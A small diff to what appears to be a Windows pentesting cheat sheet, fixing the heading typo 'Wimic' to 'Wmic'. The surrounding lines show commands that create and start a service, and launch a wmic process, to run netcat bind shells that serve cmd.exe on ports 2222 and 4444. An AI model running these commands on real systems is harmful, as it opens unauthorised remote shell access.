@@ -90,7 +90,7 @@ sc create ncservice2 binpath= "cmd.exe /k c:\tools\nc.exe -l -p 2222 -e cmd.exe"
 sc start ncservice2
 ```
 
-#### Wimic
+#### Wmic
 ```
 wmic process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
 ```
